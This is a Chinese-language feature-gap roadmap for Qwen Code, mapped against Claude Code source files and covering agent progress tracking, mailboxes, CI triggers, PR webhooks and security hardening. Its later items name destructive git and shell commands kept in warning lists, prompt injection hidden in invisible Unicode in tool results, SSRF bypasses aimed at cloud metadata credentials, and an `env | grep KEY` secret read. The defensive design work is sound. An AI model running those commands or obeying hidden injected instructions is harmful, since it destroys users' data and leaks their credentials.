**Qwen Code 修改方向**：`AgentResultDisplay` 提供最终结果但无实时进度追踪。改进方向：① 新增 `ProgressTracker`——每轮更新 toolUseCount/tokenCount/activities；② 后台代理面板显示实时进度列表；③ `<task-notification>` 格式标准化代理完成报告；④ kill 按钮一键终止卡住的代理。

**实现成本评估**：
- 涉及文件：~4 个
- 新增代码：~350 行
- 开发周期：~3 天（1 人）
- 难点：实时进度更新的性能——避免高频 UI 重渲染导致卡顿

**改进前后对比**：
- **改进前**：5 个后台代理运行 → 黑箱状态 → "做到哪了？卡住了吗？" 无法回答
- **改进后**：实时进度面板 → 每个代理的 tool 调用数 + token 用量 + 最近操作一目了然 → 卡住时一键 kill

**意义**：5 个后台代理并行运行——用户需要知道每个的进度和状态。
**缺失后果**：后台代理 = 黑箱——"做到哪了？卡住了吗？" 无法回答。
**改进收益**：实时进度面板 = 每个代理的 tool 调用数 + token 用量 + 最近操作一目了然。

---

<a id="item-18"></a>

### 18. Agent 邮箱系统（Teammate Mailbox）（P2）

你让 researcher 代理查找 API 文档，tester 代理编写测试用例——但 tester 无法知道 researcher 找到了什么结果，因为代理之间没有通信机制。它们只能通过共享文件间接协作，这种方式脆弱且不可靠。解决思路是基于文件的异步消息系统——每个 Teammate 有独立收件箱（`~/.claude/teams/{team}/inboxes/{agent}.json`），消息包含 sender、text、timestamp、read 标志等。`proper-lockfile` 确保并发写入安全（10 次重试，5-100ms 退避），支持单播和广播（`to: "*"`）。

**Qwen Code 现状**：Arena 系统用文件 IPC（status/control JSON），但无通用 Agent 间邮箱——代理之间只能通过共享文件间接协作。

**Claude Code 源码索引**：

| 文件 | 关键函数/常量 |
|------|-------------|
| `utils/teammateMailbox.ts` (400+行) | `readMailbox()`、`writeToMailbox()`、`markMessageAsReadByIndex()` |
| `tools/SendMessageTool/SendMessageTool.ts` | `HandleMessage()` 单播、`HandleBroadcast()` 广播 |

**Qwen Code 修改方向**：Arena 系统用文件 IPC（status/control JSON），但无通用 Agent 间邮箱。改进方向：① 新建 `utils/teammateMailbox.ts`——JSON 文件 + lockfile 并发控制；② SendMessage 工具支持 `to: agentName` 和 `to: "*"` 广播；③ 代理执行循环中定期检查邮箱（500ms 轮询）。

**实现成本评估**：
- 涉及文件：~3 个
- 新增代码：~400 行
- 开发周期：~3 天（1 人）
- 难点：并发写入安全——多个代理同时写同一个收件箱时的 lockfile 竞争

**改进前后对比**：
- **改进前**：researcher 找到结果 → 写入临时文件 → tester 不知道文件路径 → 协作靠猜测
- **改进后**：researcher 发送消息 `to: "tester"` → tester 收件箱收到结构化消息 → 直接读取结果

**进展**：[PR#2886](https://github.com/QwenLM/qwen-code/pull/2886)（Agent Team 实验性功能）

**意义**：多 Agent协作需要通信——researcher 告诉 tester "结果在 path X"。
**缺失后果**：Agent 间无通信 = 只能通过共享文件间接协作——脆弱且不可靠。
**改进收益**：邮箱系统 = 结构化消息传递——Agent 间直接沟通、权限请求路由。

---

<a id="item-19"></a>

### 19. 远程触发器 REST API（P2）

你想设置一个每日凌晨 3 点的代码质量扫描任务——但 `CronScheduler` 仅支持会话内 cron，关闭终端任务就丢失了，根本无法作为 CI 定时任务使用。解决思路是通过 REST API 管理定时远程 Agent——CRUD 端点 `/v1/code/triggers`，支持创建、更新、列表、获取、手动运行。触发器在云端执行（非本地），适合 CI/CD 定时任务（如每日安全扫描、定期代码审查）。

**Qwen Code 现状**：`CronScheduler` 仅支持会话内 cron（进程退出即丢失）——无法作为持久化 CI 定时任务。

**Claude Code 源码索引**：

| 文件 | 关键函数/常量 |
|------|-------------|
| `tools/RemoteTriggerTool/RemoteTriggerTool.ts` (162行) | REST API: `list`/`get`/`create`/`update`/`run` 5 种操作 |
| `skills/bundled/scheduleRemoteAgents.ts` | `/schedule` 技能——创建/管理远程定时 Agent |
| `utils/cronTasks.ts` (L30-70) | `CronTask` 类型：cron 表达式 + prompt + recurring/permanent/durable 标志 |

**Qwen Code 修改方向**：`CronScheduler` 仅支持会话内 cron（进程退出即丢失）。改进方向：① 新增 `/v1/code/triggers` REST 端点（或对接 DashScope 定时任务 API）；② 触发器配置持久化到 `.qwen/scheduled_tasks.json`；③ daemon 模式下 watch 文件变化自动加载新触发器。

**实现成本评估**：
- 涉及文件：~4 个
- 新增代码：~400 行
- 开发周期：~5 天（1 人）
- 难点：跨会话持久化——触发器状态管理和 daemon 进程的可靠性

**改进前后对比**：
- **改进前**：设置 cron 定时任务 → 关闭终端 → 任务丢失 → 无法用于 CI 定时场景
- **改进后**：REST API 创建触发器 → 持久化存储 → 跨会话存活 → 真正的 CI/CD 定时能力

**意义**：CI/CD 需要定时触发——每日安全扫描、每周代码质量报告。
**缺失后果**：cron 仅会话内 = 关闭终端即丢失——无法作为 CI 定时任务。
**改进收益**：REST API + 持久化 = 触发器跨会话存活——真正的 CI/CD 定时能力。

---

<a id="item-20"></a>

### 20. SDK 双向控制协议（P2）

你正在开发 IDE 插件集成 Agent SDK，发现 SDK 只能发送消息和审批权限——无法控制 MCP 服务器管理、模型切换、文件回退等高级操作。IDE 插件需要精细控制 Agent 行为，但控制协议覆盖不全。解决思路是 SDK 消费者与 CLI 之间的双向 NDJSON 控制协议——SDK→CLI 支持 `can_use_tool` 权限响应、`set_model` 切换模型、`interrupt` 中断、`seed_read_state` 预填缓存等；CLI→SDK 支持 `can_use_tool` 权限请求、`hook_callback` Hook 事件、`mcp_message` MCP 消息路由。26+ Hook 事件类型支持中间件模式。

**Qwen Code 现状**：TypeScript SDK 支持 `canUseTool` 回调和 `setModel`/`setPermissionMode`，但无完整控制协议——缺少 `seed_read_state`/`mcp_message`/`reload_plugins` 等高级操作。

**Claude Code 源码索引**：

| 文件 | 关键函数/常量 |
|------|-------------|
| `entrypoints/sdk/controlSchemas.ts` | 20+ 控制请求类型（`can_use_tool`/`set_model`/`interrupt`/`mcp_message` 等） |
| `entrypoints/sdk/coreSchemas.ts` (L642-655) | Stdout/Stdin 消息联合类型 |
| `bridge/bridgePermissionCallbacks.ts` | 权限回调：`allow`/`deny` + `updatedInput` + `updatedPermissions` |

**Qwen Code 修改方向**：TypeScript SDK 支持 `canUseTool` 回调和 `setModel`/`setPermissionMode`，但无完整控制协议（如 `seed_read_state`/`mcp_message`/`reload_plugins` 等高级操作）。改进方向：① 扩展控制协议覆盖 MCP 管理（`mcp_set_servers`/`mcp_reconnect`）；② 添加 `get_context_usage` 获取 token 分布；③ 添加 `rewind_files` 文件回退控制。

**实现成本评估**：
- 涉及文件：~5 个
- 新增代码：~400 行
- 开发周期：~5 天（1 人）
- 难点：协议版本兼容——新增控制类型不能破坏现有 SDK 消费者

**改进前后对比**：
- **改进前**：IDE 插件只能发消息 + 审批权限 → 无法切换 MCP / 预填缓存 / 文件回退 → 集成受限
- **改进后**：IDE 插件通过完整控制协议 → MCP 管理 + 模型切换 + 文件回退 → 任意深度集成

**意义**：IDE 插件和自动化系统需要精细控制 Agent 行为——不仅是发送消息。
**缺失后果**：SDK 只能发消息 + 审批权限——无法控制 MCP/设置/文件回退。
**改进收益**：完整控制协议 = IDE 插件可实现任意集成——模型切换、MCP 管理、文件回退。

---

<a id="item-21"></a>

### 21. CI 环境自动检测与行为适配（P2）

你在 GitHub Actions 中运行 Agent 审查 PR，但 Agent 不知道自己在哪个 CI 平台上运行——不知道当前 PR 号、分支名、commit SHA。你需要在 workflow 中手动传入这些上下文信息。解决思路是检测具体 CI 平台（GitHub Actions/CircleCI/Jenkins/GitLab CI）并自适应行为——跳过浏览器认证、启用 headless 输出、提取 CI 上下文（PR 号、分支、commit SHA）注入系统提示、调整超时配置。

**Qwen Code 现状**：仅检测通用 `CI` 环境变量（跳过浏览器认证），无具体平台检测——CI 中缺少 PR 上下文，Agent 不知道在审查哪个 PR。

**Claude Code 源码索引**：

| 文件 | 关键函数/常量 |
|------|-------------|
| `utils/env.ts` (L285, L318) | `GITHUB_ACTIONS`/`CIRCLECI`/`CI` 环境变量检测 |
| `services/analytics/metadata.ts` (L617-624) | `isCi`/`isGithubAction` + GitHub 元数据采集 |
| `main.tsx` (L531) | GitHub Actions 入口点标记 `claude-code-github-action` |

**Qwen Code 修改方向**：仅检测通用 `CI` 环境变量（跳过浏览器认证），无具体平台检测。改进方向：① 检测 `GITHUB_ACTIONS`/`GITLAB_CI`/`CIRCLECI`/`JENKINS_HOME`；② 提取平台特定上下文（PR_NUMBER、BRANCH、COMMIT_SHA）；③ CI 模式自动调整：更长超时、JSON 输出、跳过交互提示。

**实现成本评估**：
- 涉及文件：~3 个
- 新增代码：~150 行
- 开发周期：~2 天（1 人）
- 难点：各 CI 平台环境变量差异——需逐个平台验证变量名和可用性

**改进前后对比**：
- **改进前**：GitHub Actions 中运行 → Agent 不知道 PR 号和分支 → 需手动传入上下文 → 配置繁琐
- **改进后**：自动检测 GitHub Actions → 自动提取 PR/分支/commit → CI 集成零配置

**意义**：不同 CI 平台有不同的环境变量和能力——通用检测不够精准。
**缺失后果**：CI 中缺少 PR 上下文 = Agent 不知道在审查哪个 PR。
**改进收益**：平台感知 = 自动提取 PR/分支/commit 上下文——CI 集成零配置。

---

<a id="item-22"></a>

### 22. PR Webhook 事件实时订阅（P2）

你让 Agent 审查 PR，它提交了 review 评论后就退出了。reviewer 回复了新评论、CI 跑失败了——但 Agent 不知道，你需要手动再次触发 Agent 处理这些后续事件。PR 审查本该是持续过程，不应该是一次性操作。解决思路是 Agent 可订阅 GitHub PR 活动事件（review comments、CI 结果、状态变更），事件作为 user message 实时注入对话。Coordinator 代理可持续监控——CI 失败时自动修复，review 评论自动回复。

**Qwen Code 现状**：PR review 是一次性操作（工作流触发 → 评论 → 结束），无持续监控——后续事件需手动再次触发。

**Claude Code 源码索引**：

| 文件 | 关键函数/常量 |
|------|-------------|
| `coordinator/coordinatorMode.ts` (L133) | `subscribe_pr_activity` / `unsubscribe_pr_activity` |
| `commands/pr_comments/index.ts` | `/pr-comments` 获取 PR 级 + code review 评论 |

**Qwen Code 修改方向**：PR review 是一次性操作（工作流触发 → 评论 → 结束），无持续监控。改进方向：① WebSocket/SSE 订阅 GitHub PR 事件；② 事件转为 user message 注入 Agent 对话；③ Coordinator 模式下自动响应（CI 失败→修复→推送→再评论）。

**实现成本评估**：
- 涉及文件：~4 个
- 新增代码：~350 行
- 开发周期：~5 天（1 人）
- 难点：GitHub Webhook 接收——需要 HTTP 服务器或 GitHub App 接收事件推送

**改进前后对比**：
- **改进前**：Agent 提交 review → 退出 → reviewer 回复/CI 失败 → 需手动再次触发 Agent
- **改进后**：Agent 订阅 PR 事件 → reviewer 评论自动回复 → CI 失败自动修复 → 持续监控

**意义**：PR 审查是持续过程——reviewer 评论后 Agent 应能自动响应。
**缺失后果**：一次性审查 = reviewer 评论后需手动再次触发 Agent。
**改进收益**：实时订阅 = Agent 持续监控 PR——评论自动回复，CI 失败自动修复。

---

<a id="item-23"></a>

### 23. UltraReview 远程深度代码审查（P2）

你的 PR 有 100+ 文件变更，本地 `/review` 在几分钟内完成——但覆盖不全，许多隐藏 bug 没被发现。大型 PR 需要更长时间的深度分析，而本地审查受限于单次 API 调用时长。解决思路是 `/ultrareview` 在远程 CCR 环境中运行 10-20 分钟的深度审查——独立配额追踪（`reviews_used/limit/remaining`），每 10 秒发送 `<remote-review-progress>` 心跳标签保持连接，30 分钟超时保护。

**Qwen Code 现状**：PR review 通过 GitHub Actions 工作流在 runner 上执行，无独立远程深度审查——大型 PR 覆盖不全。

**Claude Code 源码索引**：

| 文件 | 关键函数/常量 |
|------|-------------|
| `commands/review/reviewRemote.ts` | 远程审查传送（teleport to CCR） |
| `tasks/RemoteAgentTask/RemoteAgentTask.tsx` (L42-45) | `REMOTE_REVIEW_TIMEOUT_MS`、进度心跳标签 |
| `services/api/ultrareviewQuota.ts` | `fetchUltrareviewQuota()` 配额追踪 |

**Qwen Code 修改方向**：PR review 通过 GitHub Actions 工作流在 runner 上执行，无独立远程深度审查。改进方向：① `/ultrareview` 命令将审查任务发送到云端执行；② 进度心跳保持连接；③ 配额追踪防止滥用；④ 结果通过 `<remote-review>` 标签回传。

**实现成本评估**：
- 涉及文件：~4 个
- 新增代码：~300 行
- 开发周期：~5 天（1 人）
- 难点：远程执行环境搭建——需要云端容器化执行基础设施

**改进前后对比**：
- **改进前**：100+ 文件 PR → 本地审查几分钟 → 覆盖不全 → 隐藏 bug 漏检
- **改进后**：`/ultrareview` → 远程 10-20 分钟深度分析 → 全面覆盖 → 发现更多隐藏 bug

**意义**：复杂 PR（100+ 文件）需要 10-20 分钟深度分析——本地审查不够深入。
**缺失后果**：本地审查 = 受限于单次 API 调用——大 PR 覆盖不全。
**改进收益**：远程深度审查 = 10-20 分钟全面分析——发现更多隐藏 bug。

---

<a id="item-24"></a>

### 24. GitHub App 自动安装与工作流生成（P2）

你想让 Agent 自动审查每个 PR——需要手动编写 workflow YAML、配置 `ANTHROPIC_API_KEY` secret、提交到仓库。每个新仓库都要重复这些步骤，配置过程容易出错。解决思路是 `/install-github-app` 命令一键自动化——检查仓库访问权限 → 生成 workflow YAML 文件 → 创建分支并提交 → 配置 API key secret → 打开浏览器创建 PR。

**Qwen Code 现状**：PR review 工作流手动配置（`.github/workflows/qwen-code-pr-review.yml`）——每个仓库需手动编写 YAML + 配置 secret。

**Claude Code 源码索引**：

| 文件 | 关键函数/常量 |
|------|-------------|
| `commands/install-github-app/setupGitHubActions.ts` (325行) | 完整安装流程：检查权限→生成 YAML→创建分支→配置 secret→打开 PR |
| `constants/github-app.ts` | 工作流模板：`claude.yml`（PR 自动审查）+ `claude-code-review.yml`（代码审查） |

**Qwen Code 修改方向**：PR review 工作流手动配置（`.github/workflows/qwen-code-pr-review.yml`）。改进方向：① `/install-github-app` 一键安装命令；② 自动生成 workflow YAML 模板；③ 自动配置 API key secret（`gh secret set`）；④ 自动创建 PR 提交 workflow 文件。

**实现成本评估**：
- 涉及文件：~3 个
- 新增代码：~350 行
- 开发周期：~3 天（1 人）
- 难点：GitHub API 权限管理——需要正确的 OAuth scope 才能创建分支和设置 secret

**改进前后对比**：
- **改进前**：每个仓库手动编写 workflow YAML + 配置 secret → 重复劳动 + 容易出错
- **改进后**：`/install-github-app` 一键安装 → 3 分钟完成 CI 集成 → 零手动编辑

**意义**：CI 集成配置复杂——手动编写 workflow YAML + 配置 secret 容易出错。
**缺失后果**：手动配置 = 每个仓库重复劳动 + 配置错误。
**改进收益**：一键安装 = 3 分钟完成 CI 集成——零手动编辑 YAML。

---

<a id="item-25"></a>

### 25. Headless 性能剖析（TTFT/延迟追踪）（P2）

你的 CI pipeline 中 Agent 执行需要 10 分钟，但你不知道时间花在了哪里——是 TTFT（Time To First Token）太慢、每轮处理延迟太高、还是系统消息 yield 时间太长。没有性能数据就无法优化。解决思路是 CI/headless 模式下自动收集性能指标——TTFT、每轮处理延迟、系统消息 yield 时间、查询开销。100% 内部用户 + 5% 外部用户采样，指标用于精确定位 CI 场景下的性能瓶颈。

**Qwen Code 现状**：headless 模式无性能剖析——CI 中无法知道哪步最慢，无数据可分析。

**Claude Code 源码索引**：

| 文件 | 关键函数/常量 |
|------|-------------|
| `utils/headlessProfiler.ts` | `headlessProfilerStartTurn()`、`headlessProfilerCheckpoint()`、`logHeadlessProfilerTurn()` |

**Qwen Code 修改方向**：headless 模式无性能剖析——不知道 CI 中哪步最慢。改进方向：① 新建 `headlessProfiler.ts`——记录 TTFT/turn latency/overhead；② CI 环境自动启用（采样率可配置）；③ 结果输出到 JSON 或遥测系统。

**实现成本评估**：
- 涉及文件：~2 个
- 新增代码：~120 行
- 开发周期：~2 天（1 人）
- 难点：低开销采集——剖析本身不能成为性能瓶颈

**改进前后对比**：
- **改进前**：CI 执行 10 分钟 → "为什么这么慢？" → 无性能数据 → 无法优化
- **改进后**：自动采集 TTFT/延迟/overhead → 精确定位瓶颈 → 针对性优化 CI 执行时间

**意义**：CI 中 Agent 执行时间直接影响 pipeline 总时长——需要知道哪步最慢。
**缺失后果**：无剖析 = "为什么 CI 这么慢？" 无数据可分析。
**改进收益**：TTFT/延迟追踪 = 精确定位瓶颈——优化 CI 执行时间。

---

<a id="item-26"></a>

### 26. 退出码标准化与 Hook 唤醒（P2）

你的 CI pipeline 依赖 Agent 退出码判断成功/失败——但退出码语义不清晰。更关键的是，后台 Hook（如 lint/test 验证）失败后 Agent 不知道该修复问题。解决思路是标准化 CI 友好的退出码语义——0=成功、1=错误、2=Hook 阻塞错误（唤醒模型重新处理）。后台异步 Hook 返回退出码 2 时唤醒 Agent 处理 Hook 结果，允许 Hook 在后台运行验证，失败时自动通知 Agent 修复。

**Qwen Code 现状**：有自定义退出码（`FatalTurnLimitedError` 等），但无 Hook 退出码 2 唤醒机制——Hook 验证失败后 Agent 无法自动响应。

**Claude Code 源码索引**：

| 文件 | 关键函数/常量 |
|------|-------------|
| `schemas/hooks.ts` (L63) | `"exit code 2 (blocking error)"` 唤醒模型 |
| `interactiveHelpers.tsx` (L67-79) | 退出码 0/1 语义 |

**Qwen Code 修改方向**：有自定义退出码（`FatalTurnLimitedError` 等），但无 Hook 退出码 2 唤醒机制。改进方向：① 标准化退出码文档（0=成功/1=错误/2=hook 阻塞/53=turn 限制）；② 后台 Hook 退出码 2 时注入 `<hook-blocking-error>` 消息唤醒 Agent；③ CI 文档说明各退出码含义。

**实现成本评估**：
- 涉及文件：~3 个
- 新增代码：~80 行
- 开发周期：~2 天（1 人）
- 难点：Hook 唤醒时机——确保 Agent 在正确的上下文中处理 Hook 失败

**改进前后对比**：
- **改进前**：Hook lint 检查失败 → 退出码被忽略 → Agent 继续下一步 → CI 误认为成功
- **改进后**：Hook lint 检查失败 → 退出码 2 → Agent 被唤醒 → 自动修复 lint 问题 → CI 正确报告

**意义**：CI pipeline 依赖退出码判断成功/失败——语义不清 = 错误的 pipeline 决策。
**缺失后果**：Hook 验证失败但退出码 0 = CI 误认为成功。
**改进收益**：标准化退出码 + Hook 唤醒 = CI 精确判断 + Agent 自动响应验证失败。

---

<a id="item-27"></a>

### 27. 破坏性命令警告系统（P2）

你审批了一个 `git push --force` 操作——权限对话框只告诉你"这是写操作"，没说具体风险。结果远程仓库的提交历史被覆盖，无法恢复。问题在于审批对话框缺少操作级别的风险说明。解决思路是对 8 种高风险 git/shell 操作显示具体风险说明——`git push --force`（"可能覆盖远程历史"）、`git reset --hard`（"丢弃未提交变更"）、`git clean -f`（"永久删除未跟踪文件"）、`git checkout .`/`git restore .`（"丢弃工作树变更"）、`git stash drop/clear`（"永久删除暂存"）、`git branch -D`（"强制删除分支"）、`--no-verify`（"跳过安全钩子"）、`git commit --amend`（"改写最后一次提交"）。

**Qwen Code 现状**：`shellReadOnlyChecker.ts` 将 `git push` 归为非 read-only（需审批），但不提供操作级别风险说明——用户审批时不知道具体风险。

**Claude Code 源码索引**：

| 文件 | 关键函数/常量 |
|------|-------------|
| `tools/BashTool/destructiveCommandWarning.ts` | 8 种 regex 模式 + 对应警告文字 |
| `tools/PowerShellTool/destructiveCommandWarning.ts` (L64) | PowerShell 版本（case-insensitive） |
| `components/permissions/BashPermissionRequest/BashPermissionRequest.tsx` (L274) | 警告文字在权限对话框中显示 |

**Qwen Code 修改方向**：`shellReadOnlyChecker.ts` 将 `git push` 归为非 read-only（需审批），但不提供操作级别风险说明。改进方向：① 新建 `destructiveCommandWarning.ts`——8 种 regex 模式匹配危险 flag；② 权限对话框中显示具体警告文字（"Note: may overwrite remote history"）；③ 系统提示中明确列出 force-push 等为"难以逆转的操作"。

**实现成本评估**：
- 涉及文件：~3 个
- 新增代码：~120 行
- 开发周期：~1 天（1 人）
- 难点：regex 模式覆盖率——既要检测各种写法变体又要避免误报

**改进前后对比**：
- **改进前**：审批 `git push --force` → 只显示"写操作" → 用户盲目批准 → 远程历史被覆盖
- **改进后**：审批 `git push --force` → 显示"可能覆盖远程历史" → 用户谨慎决策 → 避免数据丢失

**意义**：用户审批"git push --force"时只知道"这是写操作"——不知道具体风险。
**缺失后果**：用户盲目批准 force push = 远程历史被覆盖——无法恢复。
**改进收益**：风险说明 = 用户看到"可能覆盖远程历史"后谨慎决策——避免数据丢失。

---

<a id="item-28"></a>

### 28. 系统提示危险操作行为指导（P2）

模型遇到 git 合并冲突时，选择了"最省事"的路径——直接 `git checkout --theirs .` 丢弃所有本地变更。问题是系统提示中没有行为指导，模型不知道应该优先选择安全路径。解决思路是在系统提示中向模型提供分层的危险操作行为指导——总原则（"评估可逆性和影响范围"）+ 4 类危险操作具体列举（破坏性操作/难以逆转操作/影响共享状态操作/第三方上传）+ 行为准则（"不要用破坏性操作作为捷径"、"调查后再删除/覆盖"、"解决冲突而非丢弃变更"）+ 审批范围限定（"一次审批不等于所有场景的永久授权"）。

**Qwen Code 现状**：`prompts.ts` (L316) 仅有一条规则 "Never push changes to a remote repository without being asked explicitly by the user"——无分层指导，模型可能选择破坏性捷径。

**Claude Code 源码索引**：

| 文件 | 关键函数/常量 |
|------|-------------|
| `constants/prompts.ts` (L255-267) | `getActionsSection()` — "Executing actions with care" 完整行为指导 |

**Qwen Code 修改方向**：`prompts.ts` (L316) 仅 "Never push changes to a remote repository without being asked explicitly by the user"——一条规则，无分层指导。改进方向：① 新增 `getActionsSection()` 系统提示段，列举 4 类危险操作（force-push/reset --hard/rm -rf/DROP TABLE/kubectl delete 等）；② 行为准则：不绕过安全检查（--no-verify）、调查异常状态而非直接删除、解决冲突而非丢弃；③ 审批范围："用户批准一次 git push 不等于批准所有 push"；④ 终端焦点感知："用户不在时更自主，但仍对不可逆操作暂停"。

**实现成本评估**：
- 涉及文件：~1 个
- 新增代码：~50 行
- 开发周期：~1 天（1 人）
- 难点：行为指导的措辞——既要限制危险行为，又不能过度约束正常操作

**进展**：[PR#2889](https://github.com/QwenLM/qwen-code/pull/2889) ✓ 已合并

**改进前后对比**：
- **改进前**：合并冲突 → 模型选择 `git checkout --theirs .` → 丢弃所有本地变更 → 工作丢失
- **改进后**：合并冲突 → 模型遵循指导解决冲突（resolve > discard）→ 保留本地变更

**意义**：模型行为受系统提示引导——无指导则模型可能选择"最省事"的破坏性路径。
**缺失后果**：模型遇到合并冲突 → 直接 `git checkout --theirs .` 丢弃所有本地变更。
**改进收益**：行为指导 = 模型优先选择安全路径——resolve > discard，investigate > delete。

---

<a id="item-29"></a>

### 29. Unicode sanitization与 ASCII 走私防御（P2）

攻击者在 MCP 工具返回结果中嵌入了不可见的 Unicode 字符（零宽空格、RTL/LTR 标记等），这些字符用户看不到，但模型能"看到"——相当于隐藏的 prompt injection 指令。Agent 直接将未清洗的工具结果传给模型，导致模型静默执行恶意操作。解决思路是对所有外部输入（MCP 工具结果、文件内容、URL 参数）进行 Unicode sanitization——NFKC 规范化 + 移除 Cf/Co/Cn 类别字符 + 剥离零宽空格、RTL/LTR 标记、BOM。递归处理嵌套数据结构（最大 10 轮防止无限循环）。

**Qwen Code 现状**：无 Unicode sanitization——MCP 工具返回的不可见字符直接传给模型，存在 ASCII Smuggling 和隐藏 prompt injection 风险。

**Claude Code 源码索引**：

| 文件 | 关键函数/常量 |
|------|-------------|
| `utils/sanitization.ts` (92行) | NFKC + Cf/Co/Cn 移除 + 零宽/RTL/BOM 剥离 + 递归sanitization |

**Qwen Code 修改方向**：无 Unicode sanitization——MCP 工具返回的不可见字符直接传给模型。改进方向：① 新建 `utils/sanitization.ts`——NFKC + 不可见字符剥离；② 所有外部输入过sanitization函数；③ 递归处理 JSON 对象中的字符串值。

**实现成本评估**：
- 涉及文件：~2 个
- 新增代码：~100 行
- 开发周期：~1 天（1 人）
- 难点：不可见字符白名单——某些 Unicode 控制字符有合法用途（如代码中的 BOM）

**改进前后对比**：
- **改进前**：MCP 工具返回含不可见字符的结果 → 直接传给模型 → 模型执行隐藏指令 → 静默恶意操作
- **改进后**：MCP 工具返回结果 → NFKC + 不可见字符剥离 → 模型只看到用户能看到的内容

**意义**：攻击者可在 MCP 工具结果中嵌入不可见 Unicode 字符注入指令。
**缺失后果**：不可见字符 = 模型"看到"用户看不到的指令——静默执行恶意操作。
**改进收益**：Unicode sanitization = 不可见字符全部剥离——模型只看到用户能看到的内容。

---

<a id="item-30"></a>

### 30. sandbox运行时集成（P2）

Agent 执行的 shell 命令具有完整的文件系统和网络访问权限——恶意 prompt injection 可能利用这一点执行任意代码、访问敏感文件、甚至发起网络攻击。Shell 命令是最大的攻击面，需要限制其能力。解决思路是 shell 命令在sandbox中执行——限制文件系统访问（路径模式）、网络访问（域名 allowlist）、进程能力。3 种后端：macOS seatbelt、Linux bubblewrap、Docker。sandbox策略可配置，特定命令可排除（如 `npm install` 需要网络）。

**Qwen Code 现状**：Docker/seatbelt sandbox存在但非默认启用——大部分命令以完整权限执行。

**Claude Code 源码索引**：

| 文件 | 关键函数/常量 |
|------|-------------|
| `utils/sandbox/sandbox-adapter.ts` | sandbox运行时——路径模式、FS 限制、网络控制、违规事件 |
| `tools/BashTool/shouldUseSandbox.ts` (L130-153) | sandbox决策——feature gate + 排除命令列表 |

**Qwen Code 修改方向**：Docker/seatbelt sandbox存在但非默认启用。改进方向：① 默认启用轻量sandbox（文件系统限制为工作目录 + 临时目录）；② 命令排除列表；③ 违规事件记录。

**实现成本评估**：
- 涉及文件：~3 个
- 新增代码：~150 行
- 开发周期：~3 天（1 人）
- 难点：sandbox 兼容性——不同 Linux 发行版对 bubblewrap 支持差异

**改进前后对比**：
- **改进前**：shell 命令以完整权限执行 → 可访问任意文件和网络 → 恶意命令无限制
- **改进后**：shell 命令在sandbox中执行 → 文件/网络/进程受限 → 恶意命令无法越权

**意义**：Shell 命令是最大攻击面——不受限的 shell 可执行任意代码。
**缺失后果**：无sandbox = 任何命令无限制执行。
**改进收益**：sandbox = 文件/网络/进程受限——恶意命令无法越权。

---

<a id="item-31"></a>

### 31. SSRF 防护（HTTP Hook）（P2）

你的 Hook 配置中有一个 HTTP POST 操作——攻击者可能诱导 Hook 向 `169.254.169.254`（AWS metadata endpoint）发送请求，获取云凭证。基础的 `isPrivateIp()` 检查可以通过 IPv4-mapped IPv6 地址（`::ffff:10.0.0.1`）或 DNS rebinding 绕过。解决思路是 HTTP Hook 发送 POST 前验证目标——阻断私有 IP（10.0.0.0/8 等）和 IPv6 私有范围，检测 IPv4-mapped IPv6 防止绕过，DNS 查询结果二次验证防 DNS rebinding。

**Qwen Code 现状**：`isPrivateIp()` 仅基础检查，无 IPv6 和 DNS rebinding 防护——可通过地址映射和 DNS rebinding 绕过。

**Claude Code 源码索引**：

| 文件 | 关键函数/常量 |
|------|-------------|
| `utils/hooks/ssrfGuard.ts` (295行) | 私有 IP 阻断 + IPv6 + IPv4-mapped + DNS 验证 |

**Qwen Code 修改方向**：`isPrivateIp()` 仅基础检查，无 IPv6 和 DNS rebinding 防护。改进方向：① 扩展覆盖 IPv6 和 IPv4-mapped；② DNS 查询结果验证；③ HTTP Hook 必须过 SSRF guard。

**实现成本评估**：
- 涉及文件：~2 个
- 新增代码：~200 行
- 开发周期：~2 天（1 人）
- 难点：DNS rebinding 防护——需要在 DNS 解析后、HTTP 请求前二次验证 IP

**改进前后对比**：
- **改进前**：HTTP Hook 请求 `::ffff:10.0.0.1` → 绕过 IPv4 私有 IP 检查 → 访问内部服务 → 凭证泄漏
- **改进后**：HTTP Hook 请求 → 检测 IPv4-mapped IPv6 → DNS 二次验证 → 私有 IP 全阻断

**意义**：HTTP Hook 可向任意 URL POST——可能访问内部服务。
**缺失后果**：攻击者通过 Hook 访问 `169.254.169.254` 获取云凭证。
**改进收益**：SSRF guard = 私有 IP 全阻断——内部服务不可达。

---

<a id="item-32"></a>

### 32. WebFetch 域名allowlist（P2）

你让 Agent 查阅 npm 文档、MDN 参考、PyPI 包说明——每次 `WebFetch` 都弹出权限审批对话框，频繁打断工作流。这些都是常用的公开文档站点，完全可以预批准。解决思路是 130+ 常用域名预批准（文档/包管理/API 参考），匹配时无需审批。路径段边界检查确保 `/anthropic` 不匹配 `/anthropic-evil/`。

**Qwen Code 现状**：WebFetch 通过通用规则系统审批，无内置 allowlist——每次访问文档站点都需手动批准。

**Claude Code 源码索引**：

| 文件 | 关键函数/常量 |
|------|-------------|
| `tools/WebFetchTool/preapproved.ts` (167行) | 130+ 域名 + Set 快速匹配 + 路径段边界检查 |

**Qwen Code 修改方向**：WebFetch 通过通用规则系统，无内置allowlist。改进方向：① 内置常用域名allowlist；② hostname Set 快速匹配；③ 路径段边界检查。

**实现成本评估**：
- 涉及文件：~2 个
- 新增代码：~180 行
- 开发周期：~1 天（1 人）
- 难点：域名列表维护——需定期更新以覆盖新的主流文档站点

**改进前后对比**：
- **改进前**：Agent 查阅 MDN 文档 → 弹出权限审批 → 手动批准 → 每次都打断工作流
- **改进后**：Agent 查阅 MDN 文档 → 命中 allowlist → 自动通过 → 零打断

**意义**：频繁访问 npm/PyPI/MDN——每次审批影响效率。
**缺失后果**：每次 fetch 文档站点都弹审批。
**改进收益**：allowlist = 常用文档直接访问。

---

<a id="item-33"></a>

### 33. 子进程环境变量清洗（P2）

Agent 执行 shell 命令时，子进程继承了完整的环境变量——包括 `DASHSCOPE_API_KEY`、GitHub token 等敏感凭证。任何 shell 命令（甚至恶意注入的命令）都可以通过 `env | grep KEY` 读取这些密钥。解决思路是子进程启动前清洗 30+ 敏感变量——API 密钥、云凭证、GitHub token、OTEL headers，通过环境变量控制启用。

**Qwen Code 现状**：子进程继承完整环境含 API 密钥——任何 shell 命令都能读取敏感凭证。

**Claude Code 源码索引**：

| 文件 | 关键函数/常量 |
|------|-------------|
| `utils/subprocessEnv.ts` (99行) | 30+ 敏感变量清洗——API key + 云凭证 + GitHub + OTEL |

